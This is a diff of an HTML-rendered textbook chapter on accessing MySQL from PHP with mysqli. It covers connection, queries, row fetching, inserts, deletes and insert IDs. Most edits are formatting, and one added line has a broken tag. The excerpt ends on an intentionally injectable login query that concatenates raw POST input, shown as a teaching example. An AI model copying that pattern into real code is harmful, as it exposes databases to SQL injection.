@@ -9,13 +9,13 @@ layout: default
 <span>The reason for using PHP as an interface to MySQL is to format the results of SQL</span>
 <span>queries in a form visible in a web page. As long as you can log into your MySQL</span>
 <span>installation using your username and password, you can also do so from PHP.</span>
-
+<br/>
 <span>However, instead of using MySQL&rsquo;s command line to enter instructions and view out‐</span>
 <span>put, you will create query strings that are passed to MySQL. When MySQL returns its</span>
 <span>response, it will come as a data structure that PHP can recognize instead of the for‐</span>
 <span>matted output you see when you work on the command line. Further PHP com‐</span>
 <span>mands can retrieve the data and format it for the web page.</span>
-
+<br/>
 <span>In previous editions of the book, this chapter introduced the old</span>
 <span>mysql</span>
 <span>extension for accessing a MySQL database, before then mov‐</span>
@@ -28,25 +28,25 @@ layout: default
 <span>pretty much standard everywhere nowadays.</span>
 <h4>The Process</h4>
 <span>The process of using MySQL with PHP is as follows:</span>
-
+<br/>
 <span>1.</span>
 <span>Connect to MySQL and select the database to use.</span>
-
+<br/>
 <span>2.</span>
 <span>Build a query string.</span>
-
+<br/>
 <span>3.</span>
 <span>Perform the query.</span>
-
+<br/>
 <span>4.</span>
 <span>Retrieve the results and output them to a web page.</span>
-
+<br/>
 <span>5.</span>
 <span>Repeat steps 2 to 4 until all desired data has been retrieved.</span>
-
+<br/>
 <span>6.</span>
 <span>Disconnect from MySQL.</span>
-
+<br/>
 <span>We&rsquo;ll work through these sections in turn, but first it&rsquo;s important to set up your login</span>
 <span>details in a secure manner so people snooping around on your system have trouble</span>
 <span>getting access to your database.</span>
@@ -59,10 +59,10 @@ layout: default
 <span>shows such a file, which I&rsquo;ve called</span>
 <span>login.php</span>
 <span>.</span>
-
+<br/>
 <span>Example 10-1.</span>
 <span>The login.php file</span>
-
+<br/>
 <span>&lt;?php // login.php</span>
 <span>$hn = 'localhost';</span>
 <span>$db = 'publications';</span>
@@ -73,7 +73,7 @@ layout: default
 <span>password</span>
 <span>';</span>
 <span>?&gt;</span>
-
+<br/>
 <span>Type the example, replacing</span>
 <span>username</span>
 <span>and</span>
@@ -83,7 +83,7 @@ layout: default
 <span>Chapter 2</span>
 <span>.</span>
 <span>We&rsquo;ll be making use of the file shortly.</span>
-
+<br/>
 <span>The hostname</span>
 <span>localhost</span>
 <span>should work as long as you&rsquo;re using a MySQL database on</span>
@@ -91,7 +91,7 @@ layout: default
 <span>&nbsp;publications</span>
 <span>&nbsp;should work if you&rsquo;re typing the</span>
 <span>examples I&rsquo;ve used so far.</span>
-
+<br/>
 <span>The enclosing</span>
 <span>&lt;?php</span>
 <span>and</span>
@@ -107,7 +107,7 @@ layout: default
 <span>from your website, it would display as text and reveal your secrets. But, with the tags</span>
 <span>in place, all that person will see is a blank page. The file will correctly include in your</span>
 <span>other PHP files.</span>
-
+<br/>
 <span>The</span>
 <span>$hn</span>
 <span>variable will tell PHP which computer to use when connecting to a database.</span>
@@ -119,6 +119,7 @@ layout: default
 <span>, you can just use the word</span>
 <span>localhost</span>
 <span>(or the IP address 127.0.0.1).</span>
+<br/>
 <span>The database we&rsquo;ll be using,</span>
 <span>$db</span>
 <span>, is the one called</span>
@@ -129,6 +130,7 @@ layout: default
 <span>case you have to modify</span>
 <span>login.php</span>
 <span>accordingly).</span>
+<br/>
 <span>Another benefit of keeping these login details in a single place is</span>
 <span>that you can change your password as frequently as you like and</span>
 <span>there will be only one file to update when you do, no matter how</span>
@@ -147,6 +149,7 @@ layout: default
 <span>is</span>
 <span>a</span>
 <span>fatal error.</span>
+<br/>
 <span>Also, using</span>
 <span>require_once</span>
 <span>instead of</span>
@@ -156,12 +159,15 @@ layout: default
 <span>accesses.</span>
 <span>Example 10-2</span>
 <span>shows the code to use.</span>
+<br/>
 <span>Example 10-2. Connecting to a MySQL server with mysqli</span>
+<br/>
 <span>&lt;?php</span>
 <span>require_once 'login.php';</span>
 <span>$conn = new mysqli($hn, $un, $pw, $db);</span>
 <span>if ($conn-&gt;connect_error) die($conn-&gt;connect_error);</span>
 <span>?&gt;</span>
+<br/>
 <span>This example creates a new object called</span>
 <span>$conn</span>
 <span>by calling a new instance of the</span>
@@ -172,6 +178,7 @@ layout: default
 <span>ing is achieved by referencing the</span>
 <span>$conn-&gt;connect_error</span>
 <span>property.</span>
+<br/>
 <span>The</span>
 <span>-&gt;</span>
 <span>operator indicates that the item on the right is a property or method of the</span>
@@ -182,9 +189,11 @@ layout: default
 <span>die</span>
 <span>function and display that property, which details the connection</span>
 <span>error.</span>
+<br/>
 <span>The</span>
 <span>$conn</span>
 <span>object is used in the following examples to access the MySQL database.</span>
+<br/>
 <span>The</span>
 <span>die</span>
 <span>function is great for when you are developing PHP code,</span>
@@ -192,6 +201,7 @@ layout: default
 <span>production server. In this case, you won&rsquo;t abort your PHP program,</span>
 <span>but format a message that will be displayed when the program exits</span>
 <span>normally, perhaps something like this:</span>
+<br/>
 <span>function mysql_fatal_error($msg)</span>
 <span>{</span>
 <span>$msg2 = mysql_error();</span>
@@ -205,18 +215,22 @@ layout: default
 <span>our administrator&lt;/a&gt;. Thank you.</span>
 <span>_END;</span>
 <span>}</span>
-<span>Building and executing a query</span>
+<br/>
+<h6>Building and executing a query</h6>
 <span>Sending a query to MySQL from PHP is as simple as issuing it using the</span>
 <span>query</span>
 <span>method of a connection object.</span>
 <span>Example 10-3</span>
 <span>shows you how to use it.</span>
+<br/>
 <span>Example 10-3. Querying a database with mysqli</span>
+<br/>
 <span>&lt;?php</span>
 <span>$query = "SELECT * FROM classics";</span>
 <span>$result = $conn-&gt;query($query);</span>
 <span>if (!$result) die($conn-&gt;error);</span>
 <span>?&gt;</span>
+<br/>
 <span>Here the variable</span>
 <span>$query</span>
 <span>is assigned a string containing the query to be made, and</span>
@@ -237,11 +251,12 @@ layout: default
 <span>die</span>
 <span>function is called</span>
 <span>to display that error.</span>
+<br/>
 <span>All the data returned by MySQL is now stored in an easily interrogatable format in</span>
 <span>the</span>
 <span>$result</span>
 <span>object.</span>
-<span>Fetching a result</span>
+<h6>Fetching a result</h6>
 <span>Once you have an object returned in</span>
 <span>$result</span>
 <span>, you can use it to extract the data you</span>
@@ -259,7 +274,9 @@ layout: default
 <span>of files available at</span>
 <span>lpmj.net</span>
 <span>).</span>
+<br/>
 <span>Example 10-4. Fetching results one cell at a time</span>
+<br/>
 <span>&lt;?php // query.php</span>
 <span>require_once 'login.php';</span>
 <span>$conn = new mysqli($hn, $un, $pw, $db);</span>
@@ -284,8 +301,10 @@ layout: default
 <span>$result-&gt;close();</span>
 <span>$conn-&gt;close();</span>
 <span>?&gt;</span>
+<p><img src="images/10.1.png"/></p>
 <span>Figure 10-1. The output from the query.php program in</span>
 <span>Example 10-4</span>
+<br/>
 <span>Here, to seek to the correct row each time around the loop, we call the</span>
 <span>data_seek</span>
 <span>method of</span>
@@ -295,9 +314,11 @@ layout: default
 <span>method to retrieve the value stored in each cell, and output the result using</span>
 <span>echo</span>
 <span>statements.</span>
+<br/>
 <span>You will probably agree that all this data seeking is rather cumbersome and that there</span>
 <span>ought to be a more efficient method of achieving the same result. And, indeed, there</span>
 <span>is a better method, which is to extract a row at a time.</span>
+<br/>
 <span>In</span>
 <span>Chapter 9</span>
 <span>, I talked about First, Second, and Third Normal Form,</span>
@@ -309,7 +330,7 @@ layout: default
 <span>normalization. However, for the purposes of illustrating access to</span>
 <span>MySQL from PHP, reusing this table avoids the hassle of typing in a</span>
 <span>new set of test data, so we&rsquo;ll stick with it for the time being.</span>
-<span>Fetching a row</span>
+<h6>Fetching a row</h6>
 <span>To fetch one row at a time, replace the</span>
 <span>for</span>
 <span>loop from</span>
@@ -324,7 +345,9 @@ layout: default
 <span>the name</span>
 <span>fetchrow.php</span>
 <span>.</span>
+<br/>
 <span>Example 10-5. Fetching results one row at a time</span>
+<br/>
 <span>&lt;?php //fetchrow.php</span>
 <span>require_once 'login.php';</span>
 <span>$conn = new mysqli($hn, $un, $pw, $db);</span>
@@ -346,6 +369,7 @@ layout: default
 <span>$result-&gt;close();</span>
 <span>$conn-&gt;close();</span>
 <span>?&gt;</span>
+<br/>
 <span>In this modified code, only one-fifth of the interrogations of the</span>
 <span>$result</span>
 <span>object are</span>
@@ -356,21 +380,27 @@ layout: default
 <span>assigned to the array</span>
 <span>$row</span>
 <span>.</span>
+<br/>
 <span>The</span>
 <span>fetch_array</span>
 <span>method can return three types of array according to the value</span>
 <span>passed to it:</span>
+<br/>
 <span>MYSQLI_NUM</span>
-<span>Numeric array. Each column appears in the array in the order in which you defined it</span>
-<span>when you created (or altered) the table. In our case, the zeroth element of the array</span>
-<span>contains the Author column, element 1 contains the Title, and so on.</span>
+<br/>
+<div class="t30">Numeric array. Each column appears in the array in the order in which you defined it
+when you created (or altered) the table. In our case, the zeroth element of the array
+contains the Author column, element 1 contains the Title, and so on.</div>
 <span>MYSQLI_ASSOC</span>
-<span>Associative array. Each key is the name of a column. Because items of data are refer‐</span>
-<span>enced by column name (rather than index number), use this option where possible in</span>
-<span>your code to make debugging easier and help other programmers better manage</span>
-<span>your code.</span>
+<br/>
+<div class="t30">Associative array. Each key is the name of a column. Because items of data are refer
+enced by column name (rather than index number), use this option where possible in
+your code to make debugging easier and help other programmers better manage
+your code.</div>
 <span>MYSQLI_BOTH</span>
-<span>Associative and numeric array.</span>
+<br/>
+<div class="t30">Associative and numeric array.</div>
+<br/>
 <span>Associative arrays are usually more useful than numeric ones because you can refer to</span>
 <span>each column by name, such as</span>
 <span>$row['author']</span>
@@ -378,12 +408,13 @@ layout: default
 <span>it is in the column order. So this script uses an associative array, leading us to pass</span>
 <span>MYSQLI_ASSOC</span>
 <span>.</span>
-<span>Closing a connection</span>
+<h6>Closing a connection</h6>
 <span>PHP will eventually return the memory it has allocated for objects after you have fin‐</span>
 <span>ished with the script, so in small scripts, you don&rsquo;t usually need to worry about releas‐</span>
 <span>ing memory yourself. However, if you&rsquo;re allocating a lot of result objects or fetching</span>
 <span>large amounts of data, it can be a good idea to free the memory you have been using</span>
 <span>to prevent problems later in your script.</span>
+<br/>
 <span>This becomes particularly important on higher-traffic pages, because the amount of</span>
 <span>memory consumed in a session can rapidly grow. Therefore, note the calls to the</span>
 <span>close</span>
@@ -393,8 +424,10 @@ layout: default
 <span>$conn</span>
 <span>in the preceding scripts, as soon as</span>
 <span>each object is no longer needed, like this:</span>
+<br/>
 <span>$result-&gt;close();</span>
 <span>$conn-&gt;close();</span>
+<br/>
 <span>Ideally, you should close each result object when you have finished</span>
 <span>using it, and then close the connection object when your script will</span>
 <span>not be accessing MySQL anymore. This best practice ensures that</span>
@@ -418,7 +451,9 @@ layout: default
 <span>explains</span>
 <span>forms in detail, but in this chapter I take form handling for granted</span>
 <span>and just deal with database interaction.</span>
+<br/>
 <span>Example 10-6. Inserting and deleting using sqltest.php</span>
+<br/>
 <span>&lt;?php // sqltest.php</span>
 <span>require_once 'login.php';</span>
 <span>$conn = new mysqli($hn, $un, $pw, $db);</span>
@@ -501,14 +536,17 @@ layout: default
 <span>return $conn-&gt;real_escape_string($_POST[$var]);</span>
 <span>}</span>
 <span>?&gt;</span>
+<p><img src="images/10.2.png"/></p>
 <span>Figure 10-2. The output from</span>
 <span>Example 10-6</span>
 <span>, sqltest.php</span>
+<br/>
 <span>At over 80 lines of code, this program may appear daunting, but don&rsquo;t worry&mdash;you&rsquo;ve</span>
 <span>already covered many of them in</span>
 <span>Example 10-5</span>
 <span>, and what the code does is actually</span>
 <span>quite simple.</span>
+<br/>
 <span>It first checks for any inputs that may have been made and then either inserts new</span>
 <span>data into the table</span>
 <span>&nbsp;classics</span>
@@ -517,6 +555,7 @@ layout: default
 <span>&nbsp;database or deletes a row from it,</span>
 <span>according to the input supplied. Regardless of whether there was input, the program</span>
 <span>then outputs all rows in the table to the browser. So let&rsquo;s see how it works.</span>
+<br/>
 <span>The first section of new code starts by using the</span>
 <span>isset</span>
 <span>function to check whether val‐</span>
@@ -536,6 +575,7 @@ layout: default
 <span>fields) and puts in into an array named</span>
 <span>$_POST</span>
 <span>.</span>
+<br/>
 <span>$_POST</span>
 <span>is an associative array, which you encountered in</span>
 <span>Chapter 6</span>
@@ -547,6 +587,7 @@ layout: default
 <span>$_GET</span>
 <span>associative array will be populated with the form data. They can both be</span>
 <span>read in exactly the same way.</span>
+<br/>
 <span>Each field has an element in the array named after that field. So, if a form contained a</span>
 <span>field named</span>
 <span>isbn</span>
@@ -569,6 +610,7 @@ layout: default
 <span>or</span>
 <span>$_POST["isbn"]</span>
 <span>(single and double quotes have the same effect in this case).</span>
+<br/>
 <span>If the</span>
 <span>$_POST</span>
 <span>syntax still seems complex to you, rest assured that you can just use the</span>
@@ -581,18 +623,21 @@ layout: default
 <span>fields from</span>
 <span>$_POST</span>
 <span>at the beginning of the program and then ignore it.</span>
+<br/>
 <span>There is no reason to write to an element in the</span>
 <span>$_POST</span>
 <span>array. Its</span>
 <span>only purpose is to communicate information from the browser to</span>
 <span>the program, and you&rsquo;re better off copying data to your own vari‐</span>
 <span>ables before altering it.</span>
+<br/>
 <span>So, back to the</span>
 <span>get_post</span>
 <span>function, which passes each item it retrieves through the</span>
 <span>real_escape_string</span>
 <span>method of the connection object to strip out any characters that</span>
 <span>a hacker may have inserted in order to break into or alter your database, like this:</span>
+<br/>
 <span>function get_post($conn, $var)</span>
 <span>{</span>
 <span>return $conn-&gt;real_escape_string($_POST[$var]);</span>
@@ -606,6 +651,7 @@ layout: default
 <span>$isbn</span>
 <span>will also have been</span>
 <span>posted.</span>
+<br/>
 <span>As you&rsquo;ll recall, the ISBN uniquely identifies each record. The HTML form appends</span>
 <span>the ISBN to the</span>
 <span>DELETE FROM</span>
@@ -617,6 +663,7 @@ layout: default
 <span>method of the</span>
 <span>$conn</span>
 <span>object to issue it to MySQL.</span>
+<br/>
 <span>If</span>
 <span>$_POST['delete'])</span>
 <span>is</span>
@@ -652,6 +699,7 @@ layout: default
 <span>property of the</span>
 <span>$conn</span>
 <span>object is displayed, like this:</span>
+<br/>
 <span>if (!$result) echo "INSERT failed: $query&lt;br&gt;" .</span>
 <span>$conn-&gt;error . "&lt;br&gt;&lt;br&gt;";</span>
 <h4>Displaying the Form</h4>
@@ -666,6 +714,7 @@ layout: default
 <span>outputs everything between the</span>
 <span>_END</span>
 <span>tags.</span>
+<br/>
 <span>Instead of the</span>
 <span>echo</span>
 <span>command, the program could also drop out of</span>
@@ -677,17 +726,20 @@ layout: default
 <span>. Whichever style used is a matter of programmer pref‐</span>
 <span>erence, but I always recommend staying within PHP code for these</span>
 <span>reasons:</span>
+<br/>
 <span>&bull;</span>
 <span>It makes it very clear when debugging (and also for other</span>
 <span>users) that everything within a</span>
 <span>&nbsp;.php</span>
 <span>&nbsp;file is PHP code. There‐</span>
 <span>fore, there is no need to go hunting for dropouts to HTML.</span>
+<br/>
 <span>&bull;</span>
 <span>When you wish to include a PHP variable directly within</span>
 <span>HTML, you can just type it. If you had dropped back to</span>
 <span>HTML, you would have had to temporarily reenter PHP pro‐</span>
 <span>cessing, access the variable, and then drop back out again.</span>
+<br/>
 <span>The HTML form section simply sets the form&rsquo;s action to</span>
 <span>sqltest.php</span>
 <span>. This means that</span>
@@ -699,6 +751,7 @@ layout: default
 <span>easily modify submissions and try to hack your server. Therefore, whenever possible,</span>
 <span>you should use Post submissions, which also have the benefit of hiding the posted</span>
 <span>data from view.</span>
+<br/>
 <span>Having output the form fields, the HTML displays a Submit button with the name</span>
 <span>ADD RECORD and closes the form. Note the</span>
 <span>&lt;pre&gt;</span>
@@ -716,12 +769,15 @@ layout: default
 <span>to MySQL asking to see all the records in the</span>
 <span>classics</span>
 <span>table, like this:</span>
+<br/>
 <span>$query = "SELECT * FROM classics";</span>
 <span>$result = $conn-&gt;query($query);</span>
+<br/>
 <span>After that,</span>
 <span>$rows</span>
 <span>is set to a value representing the number of rows in the table:</span>
 <span>$rows = $result-&gt;num_rows;</span>
+<br/>
 <span>Using the value in</span>
 <span>$rows</span>
 <span>, a</span>
@@ -733,7 +789,9 @@ layout: default
 <span>$result</span>
 <span>object is</span>
 <span>called to seek to the relevant items of data we&rsquo;re interested in, like this:</span>
+<br/>
 <span>$result-&gt;data_seek($j);</span>
+<br/>
 <span>Then the array</span>
 <span>$row</span>
 <span>is populated with a row of results by calling the</span>
@@ -745,6 +803,7 @@ layout: default
 <span>, which forces the return</span>
 <span>of a numeric (rather than associative) array, like this:</span>
 <span>$row = $result-&gt;fetch_array(MYSQLI_NUM);</span>
+<br/>
 <span>With the data in</span>
 <span>$row</span>
 <span>, it&rsquo;s now a simple matter to display it within the heredoc</span>
@@ -753,6 +812,7 @@ layout: default
 <span>&lt;pre&gt;</span>
 <span>tag to line up the display</span>
 <span>of each record in a pleasing manner.</span>
+<br/>
 <span>After the display of each record, there is a second form that also posts to</span>
 <span>sqltest.php</span>
 <span>(the program itself) but this time contains two hidden fields:</span>
@@ -769,6 +829,7 @@ layout: default
 <span>$row[4]</span>
 <span>, which contains the</span>
 <span>ISBN for the record.</span>
+<br/>
 <span>Then a Submit button with the name DELETE RECORD is displayed, and the form is</span>
 <span>closed. A curly brace then completes the</span>
 <span>for</span>
@@ -780,34 +841,45 @@ layout: default
 <span>object&rsquo;s</span>
 <span>close</span>
 <span>methods are closed to release resources back to PHP:</span>
+<br/>
 <span>$result-&gt;close();</span>
 <span>$conn-&gt;close();</span>
+<br/>
 <span>Finally, you see the definition for the function</span>
 <span>get_post</span>
 <span>, which we&rsquo;ve already looked</span>
 <span>at. And that&rsquo;s it&mdash;our first PHP program to manipulate a MySQL database. So, let&rsquo;s</span>
 <span>check out what it can do.</span>
+<br/>
 <span>Once you have typed the program (and corrected any typing errors), try entering the</span>
 <span>following data into the various input fields to add a new record for the book</span>
 <span>Moby</span>
 <span>Dick</span>
 <span>to the database:</span>
-<span>Herman Melville</span>
-<span>Moby Dick</span>
-<span>Fiction</span>
-<span>1851</span>
-<span>9780199535729</span>
+<br/>
+<b class="t30">Herman Melville</b>
+<br/>
+<b class="t30">Moby Dickbspan>
+<br/>
+<b class="t30">Fiction</b>
+<br/>
+<b class="t30">1851</b>
+<br/>
+<b class="t30">9780199535729</b>
 <h4>Running the Program</h4>
 <span>When you have submitted this data using the ADD RECORD button, scroll down to</span>
 <span>the bottom of the web page to see the new addition. It should look like</span>
 <span>Figure 10-3</span>
 <span>.</span>
+<p><img src="images/10.3.png"/></p>
 <span>Figure 10-3. The result of adding Moby Dick to the database</span>
+<br/>
 <span>Now let&rsquo;s look at how deleting a record works by creating a dummy record. So try</span>
 <span>entering just the number 1 in each of the five fields and click the ADD RECORD but‐</span>
 <span>ton. If you now scroll down, you&rsquo;ll see a new record consisting just of 1s. Obviously,</span>
 <span>this record isn&rsquo;t useful in this table, so now click the DELETE RECORD button and</span>
 <span>scroll down again to confirm that the record has been deleted.</span>
+<br/>
 <span>Assuming that everything worked, you are now able to add and</span>
 <span>delete records at will. Try doing this a few times, but leave the main</span>
 <span>records in place (including the new one for</span>
@@ -852,10 +924,13 @@ layout: default
 <span>umn for that called</span>
 <span>id</span>
 <span>.</span>
+<br/>
 <span>Example 10-7</span>
 <span>&nbsp;shows the code you might use to create a MySQL table to hold this</span>
 <span>data, with the main query assignment in bold text.</span>
+<br/>
 <span>Example 10-7. Creating a table called cats</span>
+<br/>
 <span>&lt;?php</span>
 <span>require_once 'login.php';</span>
 <span>$conn = new mysqli($hn, $un, $pw, $db);</span>
@@ -870,6 +945,7 @@ layout: default
 <span>$result = $conn-&gt;query($query);</span>
 <span>if (!$result) die ("Database access failed: " . $conn-&gt;error);</span>
 <span>?&gt;</span>
+<br/>
 <span>As you can see, the MySQL query looks pretty similar to how you would type it</span>
 <span>directly in the command line, except that there is no trailing semicolon, as none is</span>
 <span>needed when you are accessing MySQL from PHP.</span>
@@ -893,7 +969,9 @@ layout: default
 <span>in the query with that of the new table (see</span>
 <span>Example 10-8</span>
 <span>).</span>
+<br/>
 <span>Example 10-8. Describing the table cats</span>
+<br/>
 <span>&lt;?php</span>
 <span>require_once 'login.php';</span>
 <span>$conn = new mysqli($hn, $un, $pw, $db);</span>
@@ -915,6 +993,7 @@ layout: default
 <span>}</span>
 <span>echo "&lt;/table&gt;";</span>
 <span>?&gt;</span>
+<br/>
 <span>The output from the program should look like this:</span>
 <span>Column Type Null Key</span>
 <span>id smallint(6) NO PRI</span>
@@ -930,7 +1009,9 @@ layout: default
 <span>and you&rsquo;ll have to re-create it using</span>
 <span>Example 10-7</span>
 <span>.</span>
+<br/>
 <span>Example 10-9. Dropping the table cats</span>
+<br/>
 <span>&lt;?php</span>
 <span>require_once 'login.php';</span>
 <span>$conn = new mysqli($hn, $un, $pw, $db);</span>
@@ -945,7 +1026,9 @@ layout: default
 <span>Let&rsquo;s add some data to the table by using the code in</span>
 <span>Example 10-10</span>
 <span>.</span>
+<br/>
 <span>Example 10-10. Adding data to table cats</span>
+<br/>
 <span>&lt;?php</span>
 <span>require_once 'login.php';</span>
 <span>$conn = new mysqli($hn, $un, $pw, $db);</span>
@@ -956,12 +1039,15 @@ layout: default
 <span>$result = $conn-&gt;query($query);</span>
 <span>if (!$result) die ("Database access failed: " . $conn-&gt;error);</span>
 <span>?&gt;</span>
+<br/>
 <span>You may wish to add a couple more items of data by modifying</span>
 <span>$query</span>
 <span>as follows and</span>
 <span>calling up the program in your browser again:</span>
+<br/>
 <span>$query = "INSERT INTO cats VALUES(NULL, 'Cougar', 'Growler', 2)";</span>
 <span>$query = "INSERT INTO cats VALUES(NULL, 'Cheetah', 'Charly', 3)";</span>
+<br/>
 <span>By the way, notice the</span>
 <span>NULL</span>
 <span>value passed as the first parameter? This is because the</span>
@@ -973,6 +1059,7 @@ layout: default
 <span>NULL</span>
 <span>value,</span>
 <span>which will be ignored.</span>
+<br/>
 <span>Of course, the most efficient way to populate MySQL with data is to create an array</span>
 <span>and insert the data with a single query.</span>
 <h4>Retrieving Data</h4>
@@ -982,7 +1069,9 @@ layout: default
 <span>Example 10-11</span>
 <span>shows how</span>
 <span>you can check that it was correctly inserted.</span>
+<br/>
 <span>Example 10-11. Retrieving rows from the cats table</span>
+<br/>
 <span>&lt;?php</span>
 <span>require_once 'login.php';</span>
 <span>$conn = new mysqli($hn, $un, $pw, $db);</span>
@@ -1004,14 +1093,17 @@ layout: default
 <span>}</span>
 <span>echo "&lt;/table&gt;";</span>
 <span>?&gt;</span>
+<br/>
 <span>This code simply issues the MySQL query</span>
 <span>SELECT * FROM cats</span>
 <span>and then displays all</span>
 <span>the rows returned. Its output is as follows:</span>
+<br/>
 <span>Id Family Name Age</span>
 <span>1 Lion Leo 4</span>
 <span>2 Cougar Growler 2</span>
 <span>3 Cheetah Charly 3</span>
+<br/>
 <span>Here you can see that the</span>
 <span>id</span>
 <span>column has correctly auto-incremented.</span>
@@ -1034,7 +1126,9 @@ layout: default
 <span>in</span>
 <span>Example 10-12</span>
 <span>.</span>
+<br/>
 <span>Example 10-12. Renaming Charly the cheetah to Charlie</span>
+<br/>
 <span>&lt;?php</span>
 <span>require_once 'login.php';</span>
 <span>$conn = new mysqli($hn, $un, $pw, $db);</span>
@@ -1045,9 +1139,11 @@ layout: default
 <span>$result = $conn-&gt;query($query);</span>
 <span>if (!$result) die ("Database access failed: " . $conn-&gt;error);</span>
 <span>?&gt;</span>
+<br/>
 <span>If you run</span>
 <span>Example 10-11</span>
 <span>again, you&rsquo;ll see that it now outputs the following:</span>
+<br/>
 <span>Id Family Name Age</span>
 <span>1 Lion Leo 4</span>
 <span>2 Cougar Growler 2</span>
@@ -1057,7 +1153,9 @@ layout: default
 <span>from the database; see</span>
 <span>Example 10-13</span>
 <span>.</span>
+<br/>
 <span>Example 10-13. Removing Growler the cougar from the cats table</span>
+<br/>
 <span>&lt;?php</span>
 <span>require_once 'login.php';</span>
 <span>$conn = new mysqli($hn, $un, $pw, $db);</span>
@@ -1068,12 +1166,14 @@ layout: default
 <span>$result = $conn-&gt;query($query);</span>
 <span>if (!$result) die ("Database access failed: " . $conn-&gt;error);</span>
 <span>?&gt;</span>
+<br/>
 <span>This uses a standard</span>
 <span>DELETE FROM</span>
 <span>query, and when you run</span>
 <span>Example 10-11</span>
 <span>, you can</span>
 <span>see that the row has been removed in the following output:</span>
+<br/>
 <span>Id Family Name Age</span>
 <span>1 Lion Leo 4</span>
 <span>3 Cheetah Charlie 3</span>
@@ -1090,14 +1190,17 @@ layout: default
 <span>table</span>
 <span>and then refer to the newly created</span>
 <span>CustId</span>
-<span>when inserting a purchase into the pur‐</span>
+<span>when inserting a purchase into the pur</span>
 <span>chase table.</span>
+<br/>
 <span>Example 10-10</span>
 <span>&nbsp;can be rewritten as</span>
 <span>&nbsp;Example 10-14</span>
 <span>&nbsp;to display this value after each</span>
 <span>insert.</span>
+<br/>
 <span>Example 10-14. Adding data to table cats and reporting the insertion id</span>
+<br/>
 <span>&lt;?php</span>
 <span>require_once 'login.php';</span>
 <span>$conn = new mysqli($hn, $un, $pw, $db);</span>
@@ -1109,6 +1212,7 @@ layout: default
 <span>if (!$result) die ("Database access failed: " . $conn-&gt;error);</span>
 <span>echo "The Insert ID was: " . $result-&gt;insert_id;</span>
 <span>?&gt;</span>
+<br/>
 <span>The contents of the table should now look like the following (note how the previous</span>
 <span>id</span>
 <span>value of</span>
@@ -1116,15 +1220,17 @@ layout: default
 <span>is</span>
 <span>not</span>
 <span>reused, as this could cause complications in some instances):</span>
+<br/>
 <span>Id Family Name Age</span>
 <span>1 Lion Leo 4</span>
 <span>3 Cheetah Charlie 3</span>
 <span>4 Lynx Stumpy 5</span>
-<span>Using insert IDs</span>
+<h6>Using insert IDs</h6>
 <span>It&rsquo;s very common to insert data in multiple tables: a book followed by its author, or a</span>
 <span>customer followed by his purchase, and so on. When doing this with an auto-</span>
 <span>increment column, you will need to retain the insert ID returned for storing in the</span>
 <span>related table.</span>
+<br/>
 <span>For example, let&rsquo;s assume that these cats can be &ldquo;adopted&rdquo; by the public as a means of</span>
 <span>raising funds, and that when a new cat is stored in the</span>
 <span>cats</span>
@@ -1136,6 +1242,7 @@ layout: default
 <span>$inser</span>
 <span>tID</span>
 <span>, and is then used as part of the subsequent query:</span>
+<br/>
 <span>$query = "INSERT INTO cats VALUES(NULL, 'Lynx', 'Stumpy', 5)";</span>
 <span>$result = $conn-&gt;query($query);</span>
 <span>$insertID</span>
@@ -1144,31 +1251,38 @@ layout: default
 <span>$insertID</span>
 <span>, 'Ann', 'Smith')";</span>
 <span>$result = $conn-&gt;query($query);</span>
+<br/>
 <span>Now the cat is connected to its &ldquo;owner&rdquo; through the cat&rsquo;s unique ID, which was cre‐</span>
 <span>ated automatically by</span>
 <span>AUTO_INCREMENT</span>
 <span>.</span>
-<span>Using locks</span>
+<h6>Using locks</h6>
 <span>A completely safe procedure for linking tables through the insert ID is to use locks</span>
 <span>(or transactions, as described in</span>
 <span>&nbsp;Chapter 9</span>
 <span>). It can slow down response time a bit</span>
 <span>when there are many people submitting data to the same table, but it can also be</span>
 <span>worth it. The sequence is as follows:</span>
+<br/>
 <span>1.</span>
 <span>Lock the first table (e.g.,</span>
 <span>cats</span>
 <span>).</span>
+<br/>
 <span>2.</span>
 <span>Insert data into the first table.</span>
+<br/>
 <span>3.</span>
 <span>Retrieve the unique ID from the first table (the</span>
 <span>insert_id</span>
 <span>property).</span>
+<br/>
 <span>4.</span>
 <span>Unlock the first table.</span>
+<br/>
 <span>5.</span>
 <span>Insert data into the second table.</span>
+<br/>
 <span>You can safely release the lock before inserting data into the second table, because the</span>
 <span>insert ID has been retrieved and is stored in a program variable. You could also use a</span>
 <span>transaction instead of locking, but that slows down the MySQL server even more.</span>
@@ -1194,7 +1308,9 @@ layout: default
 <span>books they have bought, you can use the code in</span>
 <span>Example 10-15</span>
 <span>.</span>
+<br/>
 <span>Example 10-15. Performing a secondary query</span>
+<br/>
 <span>&lt;?php</span>
 <span>require_once 'login.php';</span>
 <span>$conn = new mysqli($hn, $un, $pw, $db);</span>
@@ -1219,6 +1335,7 @@ layout: default
 <span>echo " '$subrow[1]' by $subrow[0]&lt;br&gt;";</span>
 <span>}</span>
 <span>?&gt;</span>
+<br/>
 <span>This program uses an initial query to the</span>
 <span>customers</span>
 <span>table to look up all the customers</span>
@@ -1227,10 +1344,12 @@ layout: default
 <span>classics</span>
 <span>table to find out the title and author for each. The output from this code</span>
 <span>should be as follows:</span>
+<br/>
 <span>Mary Smith purchased ISBN 9780582506206:</span>
 <span>'Pride and Prejudice' by Jane Austen</span>
 <span>Jack Wilson purchased ISBN 9780517123201:</span>
 <span>'The Origin of Species' by Charles Darwin</span>
+<br/>
 <span>Of course, although it wouldn&rsquo;t illustrate performing additional</span>
 <span>queries, in this particular case you could also return the same</span>
 <span>information using a</span>
@@ -1238,15 +1357,18 @@ layout: default
 <span>query (see</span>
 <span>Chapter 8</span>
 <span>), like this:</span>
+<br/>
 <span>SELECT name,isbn,title,author FROM customers</span>
 <span>NATURAL JOIN classics;</span>
 <h3>Preventing Hacking Attempts</h3>
 <span>If you haven&rsquo;t looked into it, you may find it hard to appreciate just how dangerous it</span>
 <span>is to pass user input unchecked to MySQL. For example, suppose you have a simple</span>
 <span>piece of code to verify a user, and it looks like this:</span>
+<br/>
 <span>$user = $_POST['user'];</span>
 <span>$pass = $_POST['pass'];</span>
 <span>$query = "SELECT * FROM users WHERE user='$user' AND pass='$pass'";</span>
+<br/>
 <span>At first glance, you might think this code is perfectly fine. If the user enters values of</span>
 <span>fredsmith</span>
 <span>and</span>
@@ -1257,16 +1379,22 @@ layout: default
 <span>$pass</span>
 <span>, respectively, then the query string, as</span>
 <span>passed to MySQL, will be as follows:</span>
+<br/>
 <span>SELECT * FROM users WHERE user='fredsmith' AND pass='mypass'</span>
+<br/>
 <span>This is all well and good, but what if someone enters the following for</span>
